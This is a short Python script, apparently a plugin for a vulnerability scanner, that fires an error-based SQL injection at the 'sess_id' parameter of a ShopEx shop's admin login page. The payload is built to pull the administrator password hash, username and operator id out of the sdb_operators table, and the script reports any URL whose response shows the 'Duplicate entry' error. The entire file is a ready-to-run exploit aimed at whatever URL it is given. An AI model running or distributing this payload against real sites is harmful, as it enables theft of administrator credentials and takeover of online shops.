#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="\"/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0\")*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1"
bug ="Duplicate entry"
info = "/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
